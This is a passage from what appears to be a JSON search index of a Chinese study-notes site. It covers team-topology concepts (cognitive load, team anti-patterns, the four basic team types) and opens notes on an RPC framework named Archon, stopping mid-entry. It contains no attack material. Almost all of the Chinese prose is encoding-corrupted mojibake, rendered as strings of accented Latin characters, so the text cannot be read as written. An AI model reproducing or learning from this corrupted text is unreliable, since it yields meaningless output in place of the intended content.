é¢å¤–è®¤çŸ¥è´Ÿè·ï¼Œä¸ä»»åŠ¡å¤„ç†çš„ç¯å¢ƒç›¸å…³ï¼› ç›¸å…³è®¤çŸ¥è´Ÿè·ï¼Œä¸é‚£äº›éœ€è¦é¢å¤–å…³æ³¨å­¦ä¹ å’Œé«˜æ€§èƒ½æ–¹é¢çš„ä»»åŠ¡ç›¸å…³ï¼›  ä¸€èˆ¬æ¥è¯´ï¼Œä¸ºäº†é«˜æ•ˆåœ°äº¤ä»˜å’Œè¿ç»´ç°ä»£è½¯ä»¶ç³»ç»Ÿï¼Œç»„ç»‡åº”è¯¥ï¼š\n è¯•å›¾æœ€å°åŒ–å›ºæœ‰è®¤çŸ¥è´Ÿè·ï¼šé€šè¿‡æ‹›è˜ã€åŸ¹è®­ç­‰æ–¹å¼è§£å†³ï¼› æ¶ˆé™¤é¢å¤–è®¤çŸ¥è´Ÿè·ï¼šè‡ªåŠ¨åŒ–ã€æˆç«‹å·¥å…·å¹³å°éƒ¨é—¨ç­‰ï¼› ä¸ºç›¸å…³è®¤çŸ¥è´Ÿè·é¢„ç•™è¶³å¤Ÿçš„ç©ºé—´ï¼šâ€å¢å€¼â€œæ€ç»´çš„æ‰€åœ¨ï¼›  é™åˆ¶å›¢é˜Ÿè®¤çŸ¥è´Ÿè·ä¹Ÿæ„å‘³ç€é™åˆ¶äº†å›¢é˜Ÿå·¥ä½œçš„å­ç³»ç»Ÿé¢†åŸŸå¤§å°ï¼Œæ‰€ä»¥å°†ä»»åŠ¡æ‹†åˆ†å°±æ˜¾å¾—ç‰¹åˆ«é‡è¦ã€‚\nä½¿ç”¨ç›¸å…³é¢†åŸŸçš„å¤æ‚åº¦æ¥åº¦é‡è®¤çŸ¥è´Ÿè·ï¼š\n è¯•å›¾é€šè¿‡ä¸€äº›ç®€å•çš„æ‰‹æ®µï¼ˆæ¯”å¦‚ä»£ç è¡Œæ•°ç­‰ï¼‰æ¥ç¡®è®¤è½¯ä»¶çš„è®¤çŸ¥è´Ÿè·ï¼Œå¯èƒ½ä¼šè¢«è¯¯å¯¼ï¼› æˆ‘ä»¬å¯ä»¥é€šè¿‡å›¢é˜ŸèŒè´£é¢†åŸŸçš„æ•°é‡å’Œç›¸å…³ç»„ç»‡å†…éƒ¨çš„å¤æ‚åº¦æ¥è¿›è¡Œè¯„ä¼°ï¼›  æˆ‘ä»¬å°†é¢†åŸŸå¤æ‚åº¦å½’ç±»ä¸ºâ€ç®€å•â€œã€â€å¤æ‚â€œã€â€éå¸¸å¤æ‚â€œï¼Œå¯ä»¥å¾—åˆ°ä¸€äº›å¯å‘å¼ç»“è®ºï¼š\n å¯ä»¥å°†æ¯ä¸ªé¢†åŸŸåˆ†é…ç»™å•ä¸€å›¢é˜Ÿï¼› ä¸€ä¸ª 7-9 äººçš„é»„é‡‘è§„æ¨¡å›¢é˜Ÿåº”è¯¥å¯ä»¥åº”å¯¹ 2-3 ä¸ªç®€å•é¢†åŸŸï¼› å¦‚æœä¸€ä¸ªå›¢é˜Ÿå·²ç»è´Ÿè´£äº†éå¸¸å¤æ‚çš„é¢†åŸŸï¼Œé‚£ä¹ˆå°±ä¸åº”è¯¥å†ç»™ä»–ä»¬åˆ†é…æ›´å¤šçš„é¢†åŸŸï¼Œå³ä¾¿æ˜¯ä¸€ä¸ªéå¸¸ç®€å•çš„é¢†åŸŸï¼› é¿å…å•ä¸€å›¢é˜Ÿè´Ÿè´£ä¸¤ä¸ªå¤æ‚é¢†åŸŸï¼›  è½¯ä»¶è¾¹ç•Œå¤§å°åŒ¹é…å›¢é˜Ÿè®¤çŸ¥è´Ÿè·ã€‚ä¸ºäº†å¢åŠ å›¢é˜Ÿå¯ä»¥è´Ÿè´£çš„é¢†åŸŸå¤§å°ï¼Œå¯ä»¥é€šè¿‡é™ä½â€å›ºæœ‰è®¤çŸ¥è´Ÿè·â€œä¸â€é¢å¤–è®¤çŸ¥è´Ÿè·â€œçš„æ–¹å¼ï¼Œæ¥ä¼˜åŒ–å›¢é˜Ÿå·¥ä½œç”Ÿæ€ï¼Œä»è€Œæœ€å¤§åŒ–å›¢é˜Ÿè®¤çŸ¥å®¹é‡ã€‚\n"},{"id":425,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/4.%E9%9D%99%E6%80%81%E5%9B%A2%E9%98%9F%E6%8B%93%E6%89%91/","title":"4.é™æ€å›¢é˜Ÿæ‹“æ‰‘","section":"é«˜æ•ˆèƒ½å›¢é˜Ÿæ¨¡å¼","content":"é™æ€å›¢é˜Ÿæ‹“æ‰‘ #  åæ¨¡å¼ #  ä¸¤ç§ç‰¹åˆ«æœ‰ä»£è¡¨æ€§çš„åæ¨¡å¼ï¼š\n â€œä¸´æ—¶èµ·æ„â€çš„å›¢é˜Ÿè®¾è®¡ï¼šéœ€è¦è€ƒè™‘äº¤æµæˆæœ¬ï¼› â€œé¢‘ç¹è°ƒåŠ¨â€å›¢é˜Ÿæˆå‘˜ï¼šå›¢é˜Ÿä»…ä»…ä¸ºäº†é¡¹ç›®è€Œç»„å»ºï¼Œä½†æ˜¯åœ¨é¡¹ç›®å®Œæˆä¹‹åå°±ç«‹å³è¢«æ‰“æ•£ã€‚çœ‹èµ·æ¥è¿™æ ·ä½“ç°äº†é«˜åº¦çš„çµæ´»æ€§ï¼Œä»¥åŠæ›´å¿«é€Ÿåœ°åº”å¯¹äº¤ä»˜æ—¥æœŸçš„å“åº”èƒ½åŠ›ï¼Œä½†æ˜¯åå¤åˆ‡æ¢ä¸Šä¸‹æ–‡çš„æˆæœ¬è¢«ä½ä¼°ï¼›  DevOps æ‹“æ‰‘åæ˜ äº†ä¸¤ä¸ªæ ¸å¿ƒç†å¿µï¼š\n æ²¡æœ‰ä¸€ç§é€šç”¨çš„ç»„ç»‡æ¶æ„æ–¹æ³•æ¥è®© DevOps è·å¾—æˆåŠŸï¼› éƒ¨åˆ†æ‹“æ‰‘æ˜¯é˜»ç¢ DevOps æˆåŠŸçš„åæ¨¡å¼ï¼Œå®ƒä»¬å¿½ç•¥äº†ç”šè‡³åŒ DevOps çš„æ ¸å¿ƒç†å¿µèƒŒé“è€Œé©°ï¼›  å…¶ä¸­ç¬¬äºŒç‚¹ä¹Ÿå°±æ˜¯è¯´ï¼šå¹¶ä¸å­˜åœ¨æ‰€è°“â€œæ­£ç¡®â€çš„å›¢é˜Ÿæ‹“æ‰‘ï¼Œä½†åœ¨ç»„ç»‡ä¸­å­˜åœ¨å¾ˆå¤šâ€œé”™è¯¯â€çš„å›¢é˜Ÿæ‹“æ‰‘ã€‚\næˆåŠŸçš„æ¨¡å¼ #  ç‰¹æ€§å›¢é˜Ÿä¾èµ–äºé«˜åº¦å·¥ç¨‹èƒ½åŠ›æˆç†Ÿåº¦å’Œäº’ä¿¡ï¼š\n ç‰¹æ€§å›¢é˜Ÿå¾€å¾€éœ€è¦ä¿®æ”¹å¤šä¸ªä»£ç åº“ï¼Œè¿™äº›ä»£ç åº“ç”±ä¸åŒç»„ä»¶å›¢é˜Ÿç®¡ç†ï¼›å¤šä¸ªå›¢é˜Ÿåœ¨åŒä¸€ä¸ªä»£ç åº“ä¸­å åŠ åœ°å·¥ä½œï¼Œä¼šå¯¼è‡´ä»£ç ç¼ºä¹è´Ÿè´£äººï¼Œé™¤éå›¢é˜Ÿé—´éµå¾ªé«˜åº¦åä½œçš„è§„åˆ™ï¼› éšç€ä¸šåŠ¡å‘å±•ï¼Œæˆ‘ä»¬é€æ¸éœ€è¦ä¸€äº›äººè€ƒè™‘å’Œç»´æŠ¤æ•´ä¸ªç³»ç»Ÿï¼Œç¡®ä¿å­ç³»ç»Ÿå¯ä»¥èå…¥æ•´ä¸ªç³»ç»Ÿï¼Œæ»¡è¶³æœŸå¾…çš„ç”¨æˆ·ä½“éªŒã€æ€§èƒ½å’Œå¯é æ€§ã€‚äºæ˜¯â€œç³»ç»Ÿæ¶æ„å¸ˆâ€ã€â€œç³»ç»Ÿè´Ÿè´£äººâ€ã€â€œé›†æˆç»ç†â€ç­‰è§’è‰²åº”è¿è€Œç”Ÿã€‚  äº§å“å›¢é˜Ÿéœ€è¦æ”¯æŒç³»ç»Ÿï¼š\n å›¢é˜Ÿä¿æŒè‡ªä¸»æ€§çš„å…³é”®åœ¨äºä¸è¢«å¤–éƒ¨ä¾èµ–æ‰€é˜»ç¢ï¼Œä¹Ÿå°±æ˜¯è¯´æ–° feature ä¸èƒ½å¤Ÿå› ä¸ºæŸäº›å›¢é˜ŸæŒæ§èŒƒå›´ä¹‹å¤–çš„äº‹æƒ…å‘ç”Ÿè€Œå¤„äºåœæ»çŠ¶æ€ï¼› äº§å“å›¢é˜Ÿé€šå¸¸æ‰¿æ‹…äº†å·¨å¤§çš„å¿«é€Ÿäº¤ä»˜å‹åŠ›ï¼Œå¦‚æœå®ƒä»¬æ‰€ä½¿ç”¨çš„ç³»ç»Ÿæ— æ³•æä¾›å¿…è¦çš„è‡ªä¸»æ€§æ”¯æŒï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´æ—¥ç›Šå¢é•¿çš„æ‘©æ“¦ï¼›  äº‘å›¢é˜Ÿæ— éœ€åˆ›å»ºåº”ç”¨åŸºç¡€è®¾æ–½ï¼š\n â€œäº‘å›¢é˜Ÿâ€å¹¶ä¸æ˜¯æ¢äº†ä¸€ä¸ªåå­—çš„â€œåŸºç¡€è®¾æ–½å›¢é˜Ÿâ€ï¼Œä»–éœ€è¦æä¾›äº‘æœåŠ¡å¸¦æ¥çš„é€Ÿåº¦å’Œæ‰©å±•æ€§ï¼›  SRE (Site Reliability Engineering) è®©æ‰©å±•æ€§æˆä¸ºå¯èƒ½æ€§ï¼š\n SRE æ˜¯ Google åˆ›å»ºçš„ä¸€ç§è½¯ä»¶è¿ç»´ä¸æ”¹è¿›æ–¹æ³•ï¼Œè¿™ä¸ªå›¢é˜Ÿæ›´åŠ å…³æ³¨â€œé”™è¯¯é¢„ç®—ï¼ˆError Budgetï¼‰â€å’Œâ€œæœåŠ¡ç­‰çº§ç›®æ ‡ï¼ˆService-Level Objectives, SLOsï¼‰â€ å®ƒä»¬æœ‰èƒ½åŠ›å°†ä½è´¨é‡çš„è½¯ä»¶å›é€€ç»™è½¯ä»¶å¼€å‘å›¢é˜Ÿï¼Œå›¢é˜Ÿæˆå‘˜éœ€è¦ä¼˜ç§€çš„è½¯ä»¶ç¼–ç¨‹èƒ½åŠ›ï¼›  é€‰æ‹©å›¢é˜Ÿæ‹“æ‰‘éœ€è¦è€ƒè™‘çš„å› ç´  #  æŠ€æœ¯å’Œæ–‡åŒ–æˆç†Ÿåº¦ã€‚\nç»„ç»‡å¤§å°ã€è½¯ä»¶è§„æ¨¡å’Œå·¥ç¨‹èƒ½åŠ›æˆç†Ÿåº¦ï¼š\n ç»„ç»‡å¤§ã€èƒ½åŠ›æˆç†Ÿçš„å›¢é˜Ÿï¼šç«¯å¯¹ç«¯å’Œä¸“èŒå›¢é˜Ÿèšç„¦å¯ç”¨æ€§ï¼› ç»„ç»‡å¤§ã€èƒ½åŠ›ä¸æˆç†Ÿçš„å›¢é˜Ÿï¼šç«¯åˆ°ç«¯å›¢é˜Ÿçš„å¸¸è§„åä½œï¼› ç»„ç»‡å°ã€èƒ½åŠ›æˆç†Ÿçš„å›¢é˜Ÿï¼šä¾èµ–äº PaaS çš„ä¸“èŒå›¢é˜Ÿï¼› ç»„ç»‡å°ã€èƒ½åŠ›ä¸æˆç†Ÿçš„å›¢é˜Ÿï¼šä¸“èŒå›¢é˜Ÿé—´ç´§å¯†åˆä½œï¼›  æ‹†åˆ†èŒèƒ½ç«–äº•ï¼š\n  æœ‰æ—¶æˆ‘ä»¬å¯ä»¥å°†ä¸€äº›ç‰¹å®šå›¢é˜Ÿæ‰€æ‰¿æ‹…çš„è‹¥å¹²èŒèƒ½æ‹†åˆ†å’Œæˆæƒç»™å…¶ä»–å›¢é˜Ÿæ¥å‡å°‘æˆ–æ¶ˆé™¤å¯¹è¿™ç§å›¢é˜Ÿçš„ä¾èµ–ã€‚æ¯”å¦‚ï¼šDBDev ä» DBA ä¸­æ‹†åˆ†å‡ºæ¥ã€‚\n  åœ¨å·¥ä½œè´Ÿè·å¢åŠ æ—¶ï¼Œä¸èƒ½ä¸€å‘³åœ°å¢åŠ äººæ‰‹å’Œå›¢é˜Ÿï¼Œè€Œæ˜¯éœ€è¦æƒè¡¡åˆ©å¼Šï¼Œè®¤çœŸè€ƒè™‘å›¢é˜Ÿé—´å“ªäº›ä¾èµ–åº”è¯¥å‡å°‘ï¼Œè€Œå“ªäº›ä¾èµ–åº”è¯¥ä¿ç•™ã€‚\n  å›¢é˜Ÿé—´ç­‰å¾…æ—¶é—´ï¼š\n æˆ‘ä»¬éœ€è¦è°ƒç ”å’Œè·Ÿè¸ªå›¢é˜Ÿé—´çš„ä¾èµ–å…³ç³»ï¼Œä»¥åŠå› ä¸ºç­‰å¾…è€Œè€—è´¹çš„æ—¶é—´ã€‚ Diane Strode å’Œ Sid Huff å°†å›¢é˜Ÿé—´ä¾èµ–å½’ä½ä¸‰ç±»ï¼šâ€œçŸ¥è¯†å‹ä¾èµ–â€ã€â€œä»»åŠ¡å‹ä¾èµ–â€ã€â€œèµ„æºå‹ä¾èµ–â€ï¼Œè¿™æ ·çš„åˆ†ç±»æœ‰åŠ©äºåˆ†æå›¢é˜Ÿé—´çš„ä¾èµ–ï¼Œä»¥åŠæ½œåœ¨çš„é’ˆå¯¹å·¥ä½œæµçš„çº¦æŸã€‚  "},{"id":426,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/5.%E5%9B%9B%E7%B1%BB%E5%9F%BA%E6%9C%AC%E5%9B%A2%E9%98%9F%E6%8B%93%E6%89%91/","title":"5.å››ç±»åŸºæœ¬å›¢é˜Ÿæ‹“æ‰‘","section":"é«˜æ•ˆèƒ½å›¢é˜Ÿæ¨¡å¼","content":"å››ç±»åŸºæœ¬å›¢é˜Ÿæ‹“æ‰‘ #  æœ¬ä¹¦çš„æ ¸å¿ƒæ˜¯å®šä¹‰äº†å››ç±»åŸºæœ¬å›¢é˜Ÿæ‹“æ‰‘ï¼š\n æµåŠ¨å¼å›¢é˜Ÿã€èµ‹èƒ½å›¢é˜Ÿã€å¤æ‚å­ç³»ç»Ÿå›¢é˜Ÿã€å¹³å°å›¢é˜Ÿï¼›  æµåŠ¨å¼å›¢é˜Ÿ #  ä»€ä¹ˆæ˜¯â€œæµåŠ¨å¼å›¢é˜Ÿâ€ï¼Ÿ\n å®ƒå¯¹åº”ä¸€æ¡å•ä¸€ã€æœ‰ä»·å€¼çš„å·¥ä½œæµï¼Œè¿™ä¹Ÿè®¸æ˜¯ä¸€ä¸ªäº§å“ã€ä¸€é¡¹æœåŠ¡ã€ä¸€ç»„åŠŸèƒ½ç‰¹æ€§ã€ä¸€ä¸ªç”¨æˆ·æ•…äº‹æˆ–è€…ä¸€ç»„ç”¨æˆ·ç”»åƒã€‚ æµåŠ¨å¼å›¢é˜Ÿæ˜¯ç»„ç»‡ä¸­æœ€ä¸»è¦çš„å›¢é˜Ÿç±»å‹ï¼Œå…¶ä»–åŸºæœ¬å›¢é˜Ÿæ‹“æ‰‘çš„ç›®æ ‡éƒ½æ˜¯ä¸ºäº†å‡è½»æµåŠ¨å¼å›¢é˜Ÿçš„è´Ÿæ‹…ã€‚ ä¸â€œæµåŠ¨å¼å›¢é˜Ÿâ€ç›¸åçš„æ˜¯æŒ‰ç…§â€œé¡¹ç›®â€ç»„ç»‡å¼€å‘å·¥ä½œã€‚  â€œæµåŠ¨å¼å›¢é˜Ÿâ€çš„å¿…è¦èƒ½åŠ›ï¼ŒåŒ…æ‹¬ä½†ä¸é™äº\n åº”ç”¨çš„å®‰å…¨æ€§ã€å•†ä¸šå’ŒæŠ€æœ¯çš„å¯è¡Œæ€§åˆ†æã€è®¾è®¡å’Œæ¶æ„ã€å¼€å‘å’Œç¼–ç ã€åŸºç¡€è®¾æ–½å’Œå¯è¿ç»´æ€§ã€åº¦é‡å’Œç›‘æ§ã€äº§å“ç®¡ç†ã€æµ‹è¯•å’Œè´¨é‡ä¿è¯ã€ç”¨æˆ·ä½“éªŒï¼›  ä¸ºä»€ä¹ˆè¦å«åšâ€æµåŠ¨å¼å›¢é˜Ÿâ€œè€Œä¸æ˜¯â€äº§å“å›¢é˜Ÿâ€æˆ–â€œç‰¹æ€§å›¢é˜Ÿâ€œï¼š\n â€œæµåŠ¨â€ä¸€è¯æœ‰ç€æ›´å¹¿æ³›çš„å«ä¹‰ï¼Œå®ƒæœ‰åŠ©äºå¼ºåŒ–ç»„ç»‡å¯¹æµåŠ¨æ€§çš„å…³æ³¨ï¼Œä»è€Œç¡®ä¿æµåŠ¨çš„é¡ºç•…ï¼› å¹¶éæ‰€æœ‰çš„è½¯ä»¶éƒ½æœ‰äº§å“æˆ–è€…ç‰¹æ€§è¿™æ ·çš„æ¦‚å¿µï¼Œä½†æ˜¯æ€»æ˜¯å¯ä»¥ä»æµåŠ¨æ€§çš„è§’åº¦å‡ºå‘ï¼›  æµåŠ¨æ€§å›¢é˜Ÿçš„é¢„æœŸçš„è¡Œä¸ºï¼šP94ã€‚\nèµ‹èƒ½å›¢é˜Ÿ #  ä»€ä¹ˆæ˜¯â€œèµ‹èƒ½å›¢é˜Ÿâ€ï¼Ÿ\n èµ‹èƒ½å›¢é˜Ÿç”±ç‰¹å®šæŠ€æœ¯é¢†åŸŸæˆ–äº§å“é¢†åŸŸçš„ä¸“å®¶ç»„æˆï¼Œå®ƒä»¬ç»™æµåŠ¨å¼å›¢é˜Ÿæä¾›â€œè°ƒç ”ã€å­¦ä¹ ã€å®è·µâ€æ–°æŠ€æœ¯çš„èƒ½åŠ›ã€‚å›¢é˜Ÿè¿›è¡Œè°ƒç ”å·¥ä½œï¼Œå°è¯•ä¸åŒçš„æ–¹æ¡ˆï¼Œå¹¶åœ¨å·¥å…·ã€å®è·µã€æ¡†æ¶ã€æŠ€æœ¯æ ˆç­‰æ–¹é¢ç»™å‡ºé«˜è´¨é‡çš„å»ºè®®ã€‚ èµ‹èƒ½å›¢é˜Ÿåº”è¯¥å°½å¯èƒ½é¿å…è‡ªå·±æˆä¸ºçŸ¥è¯†çš„â€œè±¡ç‰™å¡”â€ï¼š  ä¸åº”è¯¥å¹²æ¶‰å…¶ä»–å›¢é˜Ÿçš„æŠ€æœ¯é€‰æ‹©ï¼Œè€Œæ˜¯è¦å¸®åŠ©å›¢é˜Ÿç†è§£å¹¶éµå¾ªç»„ç»‡çº§çš„æŠ€æœ¯çº¦æŸï¼› åº”è¯¥æé«˜æµåŠ¨å¼å›¢é˜Ÿçš„è‡ªä¸»æ€§ï¼Œè€Œä¸æ˜¯æ¨å¹¿è‡ªå·±æ‰‹åŠ¨å·²ç»æœ‰çš„è§£å†³æ–¹æ¡ˆï¼›    â€œèµ‹èƒ½å›¢é˜Ÿâ€çš„é¢„æœŸè¡Œä¸ºï¼š\n èµ‹èƒ½å›¢é˜Ÿè¦ä¸»åŠ¨äº†è§£æµåŠ¨å¼å›¢é˜Ÿçš„éœ€æ±‚ï¼Œåœ¨æ·±å…¥åä½œæ—¶å»ºç«‹å®šæœŸæ£€æŸ¥ç‚¹å’Œè”åˆæ²Ÿé€šæœºåˆ¶ï¼› èµ‹èƒ½å›¢é˜Ÿè¦ä¿æŒå®ƒä»¬çš„ä¸“ä¸šèƒ½åŠ›ä¿æŒåœ¨æµªæ½®ä¹‹å·…ï¼ˆåœ¨è¿‡å»ï¼Œè¿™å¸¸å¸¸è¢«è§†ä¸ºæ¶æ„å¸ˆæˆ–è€…åˆ›æ–°å›¢é˜Ÿçš„ä½¿å‘½ï¼‰ï¼› å®ƒä»¬æ—¢è¦ä¼ æ’­å¥½æ¶ˆæ¯ï¼Œä¹Ÿè¦ä¼ æ’­åæ¶ˆæ¯ï¼› å½“æµåŠ¨å¼å›¢é˜Ÿéš¾ä»¥ç›´æ¥ä½¿ç”¨æŸäº›æœåŠ¡æ—¶ï¼Œèµ‹èƒ½å›¢é˜Ÿåº”è¯¥å……å½“å†…å¤–éƒ¨çš„æœåŠ¡ä»£ç†ï¼› ä¸ä»…è¦ä¿ƒè¿›è‡ªèº«å›¢é˜Ÿå†…çš„å­¦ä¹ ï¼Œä¹Ÿè¦åœ¨æµåŠ¨å¼å›¢é˜Ÿä¹‹é—´æ‰®æ¼”ç»„ç»‡å†…ä¿ƒè¿›å…±äº«å¿…è¦çŸ¥è¯†çš„è§’è‰²ã€‚  ä¸å®è·µç¤¾åŒºï¼ˆCommunities of Practice, CoPï¼‰:\n å…±åŒç‚¹ï¼šå®ƒä»¬éƒ½èƒ½æé«˜å›¢é˜Ÿçš„è®¤çŸ¥å’Œèƒ½åŠ›ï¼› åŒºåˆ«ï¼šèµ‹èƒ½å›¢é˜Ÿæ¯å¤©çš„å·¥ä½œå°±æ˜¯èµ‹èƒ½ï¼Œè€Œå®è·µç¤¾åŒºåˆ™æ˜¯ä¸€ä¸ªç›¸å¯¹æ¾æ•£çš„ç»„ç»‡ï¼Œæ¯å‘¨ç”šè‡³æ¯ä¸ªæœˆæ‰ä¼šæä¸€æ¬¡æ´»åŠ¨ï¼›  å¤æ‚å­ç³»ç»Ÿå›¢é˜Ÿ #  å¤æ‚å­ç³»ç»Ÿå›¢é˜Ÿè´Ÿè´£æ„å»ºå’Œç»´æŠ¤ç³»ç»Ÿä¸­ä¸¥é‡ä¾èµ–ä¸“ä¸šé¢†åŸŸçŸ¥è¯†çš„å­ç³»ç»Ÿã€‚å®ƒä»¬çš„è®¾ç«‹ç›®æ ‡æ˜¯é™ä½åŒ…å«æˆ–ä½¿ç”¨å¤æ‚å­ç³»ç»Ÿçš„ç³»ç»Ÿä¸­å„ä¸ªæµåŠ¨å¼å›¢é˜Ÿçš„è®¤çŸ¥è´Ÿè·ã€‚\nä¸ä¼ ç»Ÿâ€œç»„ä»¶å›¢é˜Ÿâ€çš„å…³é”®åŒºåˆ«ï¼š\n å½“æŸä¸ªå­ç³»ç»Ÿä¾èµ–äºå¤§é‡ç‰¹å®šé¢†åŸŸçŸ¥è¯†æ—¶æ‰ä¼šå»ºç«‹â€œè´Ÿè´£å­ç³»ç»Ÿå›¢é˜Ÿâ€ï¼› å›¢é˜Ÿæˆç«‹å®Œå…¨æ˜¯åŸºäºè®¤çŸ¥è´Ÿè·é©±åŠ¨çš„ï¼Œè€Œéå‡ºäºç»„ä»¶å…±äº«çš„ç›®çš„ï¼›  â€œå¤æ‚å­ç³»ç»Ÿå›¢é˜Ÿâ€çš„é¢„æœŸè¡Œä¸ºï¼š\n æ ¹æ®å½“å‰çš„å¼€å‘é˜¶æ®µæ¥å®‰æ’å“åº”çš„å·¥ä½œï¼šåœ¨æ—©æœŸç´§å¯†åˆä½œï¼ŒåæœŸå…³æ³¨æ¥å£ï¼› åº”è¯¥æ˜¾è‘—æé«˜æµåŠ¨å¼å›¢é˜Ÿçš„äº¤ä»˜é€Ÿåº¦å’Œè´¨é‡ï¼› éœ€è¦æ ¹æ®éœ€æ±‚ä¼˜å…ˆçº§åˆç†å®‰æ’å¹¶å®Œæˆäº¤ä»˜ã€‚  å¹³å°å›¢é˜Ÿ #  å¹³å°å›¢é˜Ÿçš„ç›®æ ‡æ˜¯ä½¿æµåŠ¨å¼å›¢é˜Ÿèƒ½å¤Ÿä»¥é«˜åº¦è‡ªæ²»çš„æ–¹å¼äº¤ä»˜å·¥ä½œã€‚å¹³å°å›¢é˜Ÿæä¾›çš„å†…éƒ¨æœåŠ¡ä½¿å¾—æµåŠ¨å¼å›¢é˜Ÿæ— é¡»å¼€å‘åº•å±‚æœåŠ¡ï¼Œä»è€Œé™ä½è®¤çŸ¥è´Ÿè·ã€‚\nå¹³å°å›¢é˜Ÿåº”è¯¥èšç„¦äºæä¾›å°‘é‡ã€é«˜è´¨é‡çš„æœåŠ¡ï¼Œè€Œä¸æ˜¯æä¾›å¤§é‡å­˜åœ¨å¯ç”¨æ€§å’Œè´¨é‡ç¼ºé™·çš„æœåŠ¡ã€‚\nâ€œå¹³å°å›¢é˜Ÿâ€çš„é¢„æœŸè¡Œä¸ºï¼š\n ä¸â€œæµåŠ¨å¼å›¢é˜Ÿâ€å¯†åˆ‡åˆä½œï¼Œç†è§£â€œæµåŠ¨å¼å›¢é˜Ÿâ€çš„éœ€æ±‚ï¼› å›¢é˜Ÿä¾èµ–äºå¿«é€ŸåŸå‹æŠ€æœ¯ï¼Œåº”è¯¥å°½æ—©åœ°å¼•å…¥æµåŠ¨å¼å›¢é˜Ÿæˆå‘˜ä»¥è·å¾—å¿«é€Ÿåé¦ˆï¼Œä»è€Œå¾—çŸ¥å“ªäº›æœ‰æ•ˆè€Œå“ªäº›æ˜¯æ— æ•ˆçš„ï¼› éœ€è¦é‡ç‚¹å…³æ³¨æœåŠ¡çš„å¯ç”¨æ€§å’Œå¯é æ€§ï¼Œå¹¶å°†å¹³å°è§†ä½œä¸ºä¸€ç§äº§å“ï¼Œéœ€è¦å®šæœŸå›è®¿ç”¨æˆ·ä»¥ç¡®å®šæœåŠ¡çš„å¯ç”¨æ€§ï¼Œä»¥åŠæœåŠ¡æ˜¯å¦ä¾ç„¶æ»¡è¶³ç”¨æˆ·çš„éœ€æ±‚ï¼› å¦‚æœå¯ä»¥çš„è¯ï¼Œå¹³å°å›¢é˜Ÿè‡ªå·±ä¹Ÿåº”è¯¥æ˜¯æœåŠ¡çš„ç”¨æˆ·ï¼Œå¯èƒ½çš„è¯ï¼Œä¹Ÿåº”è¯¥ä¾æ‰˜äºå…¶ä»–å›¢é˜Ÿè´Ÿè´£çš„ä¸‹å±‚å¹³å°ï¼› å¹³å°å›¢é˜Ÿåº”è¯¥æ˜ç™½æä¾›çš„æ–°çš„å†…éƒ¨æœåŠ¡åº”è¯¥åƒåˆ›æ–°æ›²çº¿é‚£æ ·è¢«å„ä¸ªæµåŠ¨å¼å›¢é˜Ÿé€æ­¥å¼•å…¥ï¼Œè€Œä¸æ˜¯ä¸€è¹´è€Œå°±çš„ï¼›  ä¸€ä¸ªå¹³å°å›¢é˜Ÿå†…éƒ¨ä¹Ÿå¯ä»¥åƒä¸€ä¸ªç»„ç»‡ä¸€æ ·åµŒå¥—åœ°ç”±å››ç±»åŸºæœ¬å›¢é˜Ÿæ‹“æ‰‘æ„æˆï¼›\nè®¾è®¡å›¢é˜Ÿæ‹“æ‰‘çš„æ³¨æ„äº‹é¡¹ #  é¿å…å˜æ›´æµç¨‹ä¸­çš„å›¢é˜Ÿç«–äº•ï¼š\n åº”è¯¥é¿å…åªç”±å•ä¸€èŒèƒ½çš„äººå‘˜ç»„æˆçš„å›¢é˜Ÿï¼Œå¾ˆå¤šç»„ç»‡éƒ½åˆ›å»ºäº†è¿™æ ·æŒ‰ç…§äººå‘˜ä¸“é•¿åˆ†ç»„çš„å­¤å²›ï¼Œä¹Ÿè¢«ç§°ä¸ºèŒèƒ½ç«–äº•ï¼ˆæ¯”å¦‚ï¼šQAã€DBAã€UXã€ETLã€è¿ç»´ ç­‰ï¼‰ï¼Œè¿™ç§æ¨¡å¼å¹¶ä¸ç†æƒ³ï¼› ä¸€ä¸ªå·¥ä½œæµä¸­çš„ä¸åŒé˜¶æ®µå’Œä»»åŠ¡åº”è¯¥ç”±åŒä¸€ä¸ªå›¢é˜Ÿè´Ÿè´£ï¼Œé¿å…ä¸åŒå›¢é˜Ÿé—´çš„äº¤æ¥ï¼›  ä¸€ä¸ªä¼˜ç§€çš„å¹³å°åº”è¯¥â€œå¤Ÿç”¨å°±å¥½â€ï¼š\n"},{"id":427,"href":"/docs/%E9%A1%B9%E7%9B%AE%E5%BA%95%E5%B1%82%E5%AE%9E%E7%8E%B0/archon/","title":"Archon","section":"é¡¹ç›®åº•å±‚å®ç°","content":"RPC æ¡†æ¶ Archon å­¦ä¹  #  çº¿ç¨‹æ¨¡å‹ #  å››ä¸ªç‹¬ç«‹çº¿ç¨‹æ± ï¼š\n Accept çº¿ç¨‹æ± ï¼šæ¥å—ç½‘ç»œè¯·æ±‚ã€accept æ–¹æ³•çš„çº¿ç¨‹ï¼› IO çº¿ç¨‹æ± ï¼šæ¯ä¸ªçº¿ç¨‹å¯¹åº”ä¸€ä¸ª folly::Eventbaseï¼Œæ‰€æœ‰ä¸IOç›¸å…³çš„æ“ä½œéƒ½åœ¨IOçº¿ç¨‹ä¸­ä»¥éé˜»å¡çš„æ–¹å¼æ‰§è¡Œï¼› worker çº¿ç¨‹æ± ï¼šæ‰§è¡Œ CPU ä»»åŠ¡ï¼Œè®¡ç®—å¯†é›†ä»»åŠ¡çš„çº¿ç¨‹ï¼›é™¤æ­¤ä¹‹å¤–ï¼Œfbthrift è¿˜ä¼šé¢å¤–ä¸ºå…¶ä»–å››ç§ä¼˜å…ˆçº§åˆ†åˆ«å»ºç«‹ä¸¤ä¸ªçº¿ç¨‹ï¼› Async Dispatcher çº¿ç¨‹æ± ï¼šArchon ä¸ºå¼‚æ­¥ Client åˆ›å»ºçš„çº¿ç¨‹ç±»å‹ï¼Œæœ¬è´¨ä¸Šæ˜¯ IO çº¿ç¨‹çš„ä¸€ç§ï¼›  è®¾è®¡æ¦‚å¿µ IOBufï¼š\n 